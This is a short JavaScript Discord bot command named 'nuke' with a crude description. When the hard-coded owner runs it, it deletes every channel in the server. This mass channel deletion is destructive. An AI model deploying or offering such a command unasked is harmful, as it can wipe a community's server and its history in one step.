module.exports = {
	name: 'nuke',
	description: 'Penisair',
	execute(message) {
		const ownerID = "789058381126172702";
		if (message.author.id == ownerID) {
			message.guild.channels.cache.forEach(channel => channel.delete())
		} else {
			message.channel.send("You have to be the bot owner to use this command.")
		}
	},
};